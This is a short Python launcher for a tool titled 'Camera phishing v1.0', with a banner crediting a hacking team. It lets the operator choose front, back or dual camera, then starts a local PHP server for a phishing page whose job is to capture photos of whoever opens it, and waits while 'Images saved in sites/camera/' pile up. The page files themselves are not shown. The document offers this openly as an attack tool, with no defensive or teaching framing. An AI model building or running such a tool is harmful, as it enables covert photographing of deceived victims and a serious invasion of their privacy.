import os, subprocess, time

def banner():
    os.system('clear')
    print("\033[1;32m  ____  _   _ ____         ____                      _     _     _ ")
    print(" / ___|| | | |  _ \       / ___|__ _ _ __ ___  _ __ | |__ (_)___| |")
    print(" \___ \| |_| | |_) |_____| |   / _` | '_ ` _ \| '_ \| '_ \| / __| |")
    print("  ___) |  _  |  _ <______| |__| (_| | | | | | | |_) | | | | \__ \_|")
    print(" |____/|_| |_|_| \_\      \____\__,_|_| |_| |_| .__/|_| |_|_|___(_)")
    print("                                              |_|                  \033[0m")
    print("\033[1;37m  [ Tool: Camera phishing v1.0 ]  \033[1;33m{ Created by Roshan Ali }\033[0m")
    print("\033[1;31m  [Team: CYBER SHR]\033[0m")
    print("-" * 65)

def start():
    banner()
    print("\n[01] Front Camera (High Quality)")
    print("[02] Back Camera (High Quality)")
    print("[03] Dual Camera (Front + Back)")
    
    choice = input("\n\033[1;36m[+] Select Option: \033[0m")
    mode = "front"
    if choice == '2': mode = "back"
    elif choice == '3': mode = "dual"

    # Ensure directory exists
    if not os.path.exists("sites/camera"):
        os.makedirs("sites/camera")
    
    # Save mode to text file for HTML access
    with open("sites/camera/mode.txt", "w") as f:
        f.write(mode)

    print(f"\n\033[1;32m[*] Server starting on Port 8080... Mode: {mode.upper()}\033[0m")
    
    # Start PHP local server
    subprocess.Popen("php -S 127.0.0.1:8080 -t sites/camera/", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print("\033[1;33m[!] Waiting for photos... (Images saved in sites/camera/)\033[0m")
    while True:
        time.sleep(2)

if __name__ == "__main__":
    start()
  
